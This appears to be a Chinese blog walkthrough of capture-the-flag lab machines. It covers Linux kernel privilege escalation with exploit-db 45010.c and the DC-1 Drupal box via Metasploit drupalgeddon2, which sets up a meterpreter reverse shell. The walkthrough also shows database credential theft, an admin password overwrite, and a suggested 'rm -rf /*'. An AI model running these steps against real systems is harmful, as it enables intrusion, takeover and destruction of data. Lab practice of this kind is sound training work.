<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cd /usr/share/exploitdb/exploits/linux/local </span></span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">10018.sh   19073.txt  19925.c    21061.c     22340.txt  23882.pas   31959.txt  37710.txt   41173.c    45132.rb   50385.txt</span><br><span class="line">10038.txt  19074.txt  19933.rb   21062.txt   22344.txt  23892.c     319.c      37898.py    41196.txt  45147.rb   50465.c</span><br><span class="line">10060.sh   19077.c    19946.txt  21063.txt   22362.c    24027.txt   31.pl      37937.c     411.c      45175.c    50541.c</span><br><span class="line">1009.c     19078.c    19952.c    21124.txt   22363.c    24043.c     320.pl     37975.py    41240.sh   45184.sh   50689.txt</span><br><span class="line">1029.c     19080.txt  19953.c    21158.c     22376.txt  2404.c      3213.c     37987.py    41356.txt  45205.txt  50808.c</span><br><span class="line">10313.c    19095.txt  19954.c    21159.c     22452.sh   24123.sh    322.c      37988.py    41435.txt  45243.txt  50858.txt</span><br><span class="line">10396.pl   19106.c    19955.c    21216.sh    22456.txt  24141.txt   32446.txt  38232.txt   41458.c    45288.py   5092.c</span><br><span class="line">10487.txt  19122.txt  19969.c    21217.sh    22458.c    24182.c     325.c      38298.txt   41597.txt  45313.rb   5093.c</span><br><span class="line">104.c      19125.txt  19970.c    21218.sh    22531.pl   24278.sh    32700.rb   38353.txt   4172.c     45369.rb   5167.sh</span><br><span class="line">10613.c    19142.sh   19979.pl   21219.sh    22538.pl   24398.sh    32805.c    38357.c     41760.txt  45372.txt  5424.txt</span><br><span class="line">106.c      19146.sh   19980.pl   21226.c     22540.c    24406.txt   32820.txt  38390.c     41761.txt  45407.txt  586.c</span><br><span class="line">1154.pl    19240.c    19981.sh   21227.sh    22565.c    24421.c     32829.c    38473.py    41762.txt  45497.txt  587.c</span><br><span class="line">1170.c     19243.txt  19991.c    21229.txt   22567.c    24458.txt   32848.txt  38559.txt   41763.txt  45528.txt  591.c</span><br><span class="line">1181.c     19249.c    19992.c    21231.c     22594.c    24459.sh    32947.txt  38775.rb    41764.txt  45548.txt  600.c</span><br><span class="line">1187.c     19254.c    20000.c    21247.c     22616.pl   24570.txt   33028.txt  38817.txt   41765.txt  45553.c    601.c</span><br><span class="line">120.c      19255.txt  20001.sh   21248.txt   22617.c    24606.c     33145.c    38832.py    41766.txt  45573.txt  6032.py</span><br><span class="line">12130.py   19256.c    20004.c    21258.bat   22633.c    2466.pl     331.c      38937.txt   41770.txt  45575.rb   624.c</span><br><span class="line">1215.c     19257.c    20013.c    21259.java  22640.c    24694.c     33255.txt  39010.c     41786.rb   45631.md   6337.sh</span><br><span class="line">1229.sh    19259.c    20021.txt  21280.c     22643.pl   24749.sh    3330.pl    39112.txt   417.c      45715.txt  657.c</span><br><span class="line">1267.c     19270.c    20024.c    21281.c     22644.c    24750.c     33321.c    39134.txt   41875.py   45798.txt  669.c</span><br><span class="line">1297.py    19279.sh   20045.c    21302.c     22645.c    24757.java  33322.c    39166.c     41886.c    45804.txt  684.c</span><br><span class="line">1299.sh    19281.c    2004.c     21323.c     22683.pl   24758.java  33336.c    39207.txt   41907.c    45832.py   6851.c</span><br><span class="line">129.asm    19283.c    2005.c     21341.c     22695.pl   24929.rb    3333.pl    39214.c     41923.txt  45846.py   695.c</span><br><span class="line">12.c       19284.c    2006.c     21342.c     22703.c    2492.s      33387.txt  39217.c     41955.rb   45865.php  7177.c</span><br><span class="line">1300.sh    19285.txt  20093.c    21348.txt   22719.pl   24933.txt   33395.txt  39230.c     41973.txt  45886.txt  718.c</span><br><span class="line">1310.txt   19286.c    2011.sh    21353.c     22720.c    249.c       33508.txt  39244.txt   41994.c    45913.rb   71.c</span><br><span class="line">1316.pl    19302.c    2013.c     21356.sh    22729.c    25106.c     33523.c    39277.c     41995.c    45915.rb   72.c</span><br><span class="line">131.c      19305.c    20141.pl   21362.c     22745.c    25134.c     3356.sh    39285.py    41999.txt  46006.c    7313.sh</span><br><span class="line">1397.c     19311.c    20142.sh   21375.txt   22748.c    25202.c     33576.txt  393.c       42045.c    46044.md   7393.txt</span><br><span class="line">140.c      19312.c    20155.txt  21398.txt   22768.pl   25288.c     33604.sh   39433.py    42053.c    46186.rb   741.pl</span><br><span class="line">1412.rb    19314.c    2015.py    21420.c     22773.c    25289.c     33614.c    394.c       42076.py   46241.rb   744.c</span><br><span class="line">1415.c     19315.c    20160.txt  2144.sh     22775.txt  252.pl      33623.txt  39535.sh    42183.c    46341.rb   756.c</span><br><span class="line">141.c      19360.c    2016.sh    21458.txt   22781.txt  25406.sh    33808.c    39549.txt   42255.py   46359.md   75.sh</span><br><span class="line">1425.c     19370.c    20185.c    21496.c     22806.sh   25411.py    33824.c    39628.txt   42265.py   46361.py   7618.c</span><br><span class="line">14273.sh   19371.c    20201.c    21497.pl    22813.c    25444.c     3384.c     39673.py    42305.txt  46362.py   763.c</span><br><span class="line">142.c      19373.c    20250.c    21499.txt   22815.c    25450.c     33899.txt  39692.py    42356.txt  46369.md   7681.txt</span><br><span class="line">14339.sh   19374.c    20251.c    21500.txt   22836.pl   255.pl      33904.txt  39702.rb    42357.py   46676.php  776.c</span><br><span class="line">1445.c     19384.c    20252.c    21501.txt   22840.c    25688.txt   33963.txt  39734.py    42424.py   466.pl     778.c</span><br><span class="line">1449.c     193.sh     20285.c    21502.txt   22847.txt  25707.txt   339.c      39764.py    42611.txt  46730.rb   779.sh</span><br><span class="line">144.c      19419.c    20291.sh   21503.sh    22860.c    25709.sh    34001.c    39769.txt   42626.c    46807.txt  7855.txt</span><br><span class="line">145.c      19422.txt  20312.c    21504.sh    22861.c    25789.c     34267.sh   39771.txt   42887.c    46973.md   7856.txt</span><br><span class="line">14814.c    19428.c    20316.txt  21505.c     22862.c    257.pl      3426.php   39772.txt   42936.md   46978.sh   788.pl</span><br><span class="line">14830.py   19429.sh   2031.c     21506.c     22863.c    2581.c      3427.php   39810.py    42937.md   46989.sh   791.c</span><br><span class="line">15074.sh   19464.c    20338.c    21507.sh    22884.c    258.sh      3440.php   39811.txt   43006.txt  4698.c     792.c</span><br><span class="line">15150.c    19465.c    20339.sh   21538.c     22928.pl   25947.txt   34421.c    39938.rb    43007.txt  46996.sh   796.sh</span><br><span class="line">15155.c    19467.c    20341.sh   21568.c     22943.c    25993.sh    34537.txt  39967.txt   43029.c    469.sh     816.c</span><br><span class="line">1518.c     19469.c    20378.pl   21583.pl    22965.c    260.c       3479.php   39992.md    43127.c    47009.c    824.c</span><br><span class="line">15274.txt  19470.c    20385.sh   21584.pl    22971.txt  26100.sh    3480.php   3.c         43331.txt  47017.rb   8303.c</span><br><span class="line">15285.c    19474.txt  203.sh     21585.c     22979.txt  26195.txt   34923.c    40003.c     43345.c    47072.rb   8369.sh</span><br><span class="line">152.c      19485.c    20402.sh   215.c       22984.c    26218.txt   34987.c    40023.py    43359.c    470.c      8470.py</span><br><span class="line">15304.txt  19499.c    20411.c    21623.txt   22985.c    26321.c     3499.php   40025.py    43418.c    47133.txt  8478.sh</span><br><span class="line">15344.c    19500.c    20458.txt  21624.py    22993.txt  26353.txt   35021.rb   40054.c     43449.rb   47147.txt  8534.c</span><br><span class="line">15481.c    19501.c    20493.sh   21666.txt   22996.c    26451.rb    35112.sh   40169.txt   434.sh     47149.txt  8572.c</span><br><span class="line">154.c      19508.sh   20517.c    21667.c     229.c      26492.txt   35161.c    40203.py    43775.c    47163.c    8673.c</span><br><span class="line">15620.sh   19510.pl   20554.sh   21674.c     23045.pl   26498.txt   35234.py   40270.txt   438.sh     47164.sh   8678.c</span><br><span class="line">15704.c    19511.c    20555.sh   21683.c     23077.pl   27056.pl    3525.php   4028.txt    43935.txt  47165.sh   876.c</span><br><span class="line">15745.txt  19512.sh   20556.c    216.c       23119.c    27057.py    3529.php   40360.py    43971.rb   47166.sh   877.pl</span><br><span class="line">15774.c    19517.pl   20581.c    21700.c     23126.c    27065.txt   35370.c    40392.py    43979.py   47167.sh   890.pl</span><br><span class="line">1579.pl    19523.txt  205.pl     21701.pl    23168.pl   27066.txt   35450.txt  40394.rb    44023.rb   47168.c    895.c</span><br><span class="line">1591.py    19544.c    20604.sh   21732.txt   23189.c    27231.txt   35595.txt  40450.txt   44024.rb   47169.c    9135.sh</span><br><span class="line">15944.c    19565.sh   20626.c    21733.sh    23197.c    27297.c     35681.txt  40465.txt   44025.rb   47231.py   913.pl</span><br><span class="line">1596.txt   19602.c    20645.c    21761.c     231.sh     273.c       3571.php   40488.txt   44049.md   47307.rb   914.c</span><br><span class="line">16086.txt  19655.txt  20691.txt  21762.c     23204.c    27461.c     3572.php   40489.txt   44064.md   47344.rb   9191.txt</span><br><span class="line">160.c      19676.c    206.c      21763.txt   23223.c    27766.txt   35746.sh   40503.rb    44097.rb   47345.rb   91.c</span><br><span class="line">17083.pl   19677.c    20720.c    21793.txt   23228.c    27769.txt   35748.txt  405.c       44204.md   47421.rb   9207.sh</span><br><span class="line">17147.txt  19693.txt  20721.c    217.c       23251.txt  27938.rb    35749.txt  40611.c     44205.md   47466.c    9208.txt</span><br><span class="line">17391.c    19698.txt  20776.c    21814.c     23258.c    28287.c     3587.c     40616.c     44246.txt  47482.rb   924.c</span><br><span class="line">17611.pl   19699.txt  20777.c    21848.rb    23297.c    28288.c     3595.c     40634.py    44279.py   47502.py   926.c</span><br><span class="line">17787.c    19700.c    20778.sh   21865.c     23299.c    28332.rb    36229.py   40678.c     44298.c    47507.py   9302.py</span><br><span class="line">178.c      19709.sh   20781.txt  21871.c     23300.c    28405.txt   36257.txt  40679.sh    44303.c    47543.rb   9352.c</span><br><span class="line">17932.c    19710.c    20795.sh   21872.c     23301.c    285.c       36294.c    40688.rb    44325.c    4756.c     9363.c</span><br><span class="line">17942.c    19723.txt  20798.sh   218.c       23303.c    28657.c     36430.sh   40759.rb    44331.py   47580.rb   93.c</span><br><span class="line">18040.c    19727.c    20822.sh   2193.php    23308.c    28680.txt   36564.txt  40768.sh    44426.py   47687.py   9435.txt</span><br><span class="line">18064.sh   19735.txt  20823.sh   21980.c     23344.txt  28806.txt   36571.sh   40774.sh    44452.py   476.c      9436.txt</span><br><span class="line">18071.sh   19762.c    20843.txt  219.c       23345.txt  290.tcsh    36746.c    40788.txt   44523.rb   47703.txt  9479.c</span><br><span class="line">18072.sh   19763.txt  20867.txt  21.c        23346.txt  29446.c     36747.c    40789.txt   44601.txt  47726.sh   950.c</span><br><span class="line">18080.c    19764.txt  20868.txt  22002.txt   23350.c    29467.c     36782.sh   40810.c     44633.rb   47779.txt  9513.c</span><br><span class="line">18086.c    19765.txt  20897.sh   22014.c     23351.c    29714.txt   36820.txt  40812.c     44652.py   47804.rb   9521.c</span><br><span class="line">180.c      19778.c    20898.sh   22055.txt   23352.c    29746.txt   36855.py   40838.c     44654.rb   47957.rb   9543.c</span><br><span class="line">18105.sh   19779.c    20900.txt  22066.c     23364.sh   29822.c     36887.py   40839.c     44677.rb   47999.txt  9545.c</span><br><span class="line">18147.c    19787.txt  20901.c    22128.c     2338.c     29954.txt   36966.txt  40847.cpp   44688.txt  479.c      9574.txt</span><br><span class="line">18228.sh   19794.txt  20926.txt  22189.txt   23414.txt  30093.txt   369.pl     40921.sh    44696.rb   48000.sh   9575.c</span><br><span class="line">182.sh     19802.c    20927.c    22190.txt   23479.sh   30280.txt   37088.c    40936.html  44797.txt  48052.sh   9595.c</span><br><span class="line">1831.txt   19803.txt  20928.sh   221.c       23481.c    30464.c     37089.txt  40937.txt   44798.txt  48131.rb   9598.txt</span><br><span class="line">183.c      19804.pl   20967.c    22212.txt   23482.c    30503.txt   37167.c    40938.py    44806.txt  48185.rb   9608.c</span><br><span class="line">18411.c    19811.c    20979.c    22233.c     23510.c    30604.c     37168.txt  40943.txt   44842.txt  48803.py   9627.txt</span><br><span class="line">184.pl     19812.c    20986.c    22234.c     23581.pl   30605.c     37183.c    40953.sh    44889.rb   48961.py   9641.txt</span><br><span class="line">186.pl     19813.txt  20988.c    22235.pl    23634.c    30620.txt   37265.txt  40962.txt   44899.txt  48962.py   9709.txt</span><br><span class="line">18733.py   19816.txt  20990.c    22265.pl    23658.c    30780.txt   37292.c    40.pl       44904.py   48963.txt  973.c</span><br><span class="line">18783.txt  19837.c    20992.c    222.c       23674.txt  30839.c     37293.txt  41022.md    44920.txt  49259.c    974.pl</span><br><span class="line">18785.txt  19838.c    209.c      22320.c     23682.c    31151.c     3730.txt   41076.py    45009.txt  49572.txt  9844.py</span><br><span class="line">18917.txt  19867.txt  21010.sh   22321.c     23738.c    31346.c     374.c      41152.txt   45010.c    49765.txt  997.sh</span><br><span class="line">19070.txt  19883.c    21014.c    22322.c     23743.txt  3154.c      37543.c    41154.sh    45058.rb   50011.sh</span><br><span class="line">19071.txt  19900.c    21043.c    22323.c     23759.pl   317.txt     375.c      41158.md    45089.py   50135.c</span><br><span class="line">19072.txt  19915.txt  21060.c    22326.c     23849.txt  31911.txt   37631.c    41171.txt   45130.py   50236.py</span><br><span class="line"><span class="comment"># md，看到一堆漏洞执行脚本。。。吓死老子了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># cp 45010.c /root                            </span></span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># cd ~                                        </span></span><br><span class="line">                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">45010.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译完成之后可以上传靶机，执行就能获取靶机的最高权限</span></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment">#  gcc 45010.c -o 45010</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们把<code>45010</code>提权脚本上传到&#x2F;tmp&#x2F;目录下</p>
<p>&#x2F;tmp目录是任何用户都有读写权限的，这样上传就不会有出错</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801210945414.png" alt="image-20220801210945414"></p>
<p>我们再次进入shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 73349 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 80</span><br><span class="line">drwxrwxrwt 13 root     root      4096 Aug  1 06:12 .</span><br><span class="line">drwxr-xr-x 24 root     root      4096 Aug  1 04:51 ..</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 05:58 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .Test-unix</span><br><span class="line">-r--r--r--  1 root     root        11 Aug  1 05:58 .X0-lock</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 05:58 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .XIM-unix</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 .font-unix</span><br><span class="line">-rw-r--r--  1 www-data www-data 21784 Aug  1 06:09 45010</span><br><span class="line">drwxrwxrwt  2 root     root      4096 Aug  1 03:42 VMwareDnD</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 03:42 systemd-private-2066467e9de14ff390b770637de1e2d3-colord.service-h9nmfx</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 05:13 systemd-private-2066467e9de14ff390b770637de1e2d3-fwupd.service-XmNTS9</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 03:42 systemd-private-2066467e9de14ff390b770637de1e2d3-rtkit-daemon.service-Y4buax</span><br><span class="line">drwx------  3 root     root      4096 Aug  1 04:36 systemd-private-2066467e9de14ff390b770637de1e2d3-systemd-timesyncd.service-MbYS6D</span><br><span class="line">drwx------  2 root     root      4096 Aug  1 03:42 vmware-root</span><br><span class="line"><span class="built_in">chmod</span> +x 45010</span><br><span class="line"><span class="comment"># 接下来我们见证奇迹</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">./45010</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># 我们获取了最高权限</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211358000.png" alt="image-20220801211358000"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 渗透结束</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">enc</span><br><span class="line">enc.cpp</span><br><span class="line">enc.txt</span><br><span class="line">key.txt</span><br><span class="line">root.txt</span><br><span class="line">sql.py</span><br><span class="line">t.sh</span><br><span class="line">wfuzz</span><br><span class="line">wordpress.sql</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">b2b17036da1de94cfb024540a8e7075a</span><br><span class="line"><span class="built_in">cat</span> key.txt</span><br><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string <span class="string">&quot;ippsec&quot;</span> into md5 <span class="built_in">hash</span> and use it to gain yourself <span class="keyword">in</span> your real form.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以修改root密码</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211851634.png" alt="image-20220801211851634"></p>
<p>也可以<code>清清垃圾</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /*</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801211940704.png" alt="image-20220801211940704"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801212036945.png" alt="image-20220801212036945"></p>
<h3 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h3><p>开启DC1，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 192.168.10.0/24 </span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092126041.png" alt="image-20220829092126041"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -O 192.168.10.130</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092339661.png" alt="image-20220829092339661"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829092650334.png" alt="image-20220829092650334"></p>
<p>额。。。出现一个很陌生端web端，我们扫描一下这个网站的目录，这需要用dirb</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.10.130/</span><br></pre></td></tr></table></figure>

<p>没什么有用的信息，我们直接查查Drupal这个是什么东西</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829093758910.png" alt="image-20220829093758910"></p>
<p>这是一个开源端cms网站架构，我们去msfconsole查一下它漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829093927409.png" alt="image-20220829093927409"></p>
<p>使用search drupal命令查询cms的漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829094445162.png" alt="image-20220829094445162"></p>
<p>我们使用exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2漏洞模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829095305754.png" alt="image-20220829095305754"></p>
<p>然后设置载荷为payload php&#x2F;meterpreter&#x2F;reverse_tcp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>然后设定靶机IP为192.168.10.130，kali端ip为192.168.10.129</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.10.130</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.10.129</span><br></pre></td></tr></table></figure>

<p>执行run，开始渗透</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829095547587.png" alt="image-20220829095547587"></p>
<p>已经获取靶机web权限</p>
<p>可以用python达到一个交互效果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114239396.png" alt="image-20220829114239396"></p>
<p>拿到第一个flag</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114352171.png" alt="image-20220829114352171"></p>
<p>根据第一个flag，找到Drupal的默认配置文件为 &#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
<p>找到flag2</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829114941459.png" alt="image-20220829114941459"></p>
<p>登陆数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115448578.png" alt="image-20220829115448578"></p>
<p>列出数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115610590.png" alt="image-20220829115610590"></p>
<p>选中数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115738144.png" alt="image-20220829115738144"></p>
<p>列出数据库表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115810525.png" alt="image-20220829115810525"></p>
<p>选择users表查看用户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829115912590.png" alt="image-20220829115912590"></p>
<p>回到&#x2F;var&#x2F;www路径下，运行这个password-hash.sh加密脚本，得到新密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh orange</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829231852747.png" alt="image-20220829231852747"></p>
<p>我们将得到的hash在mysql中利用update语句更改密码为我刚刚生成的hash密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">use drupaldb</span><br><span class="line"></span><br><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DpCZByiTri9QH0oeoGEVtOgeLBcivMej1zI3GZ16KIzNikITspQj&#x27;</span> <span class="built_in">where</span> uid=1;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829232710615.png" alt="image-20220829232710615"></p>
<p>我们通过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure>

<p>知道已经更改admin密码为orange的hash密码</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220829232832099.png" alt="image-20220829232832099"></p>
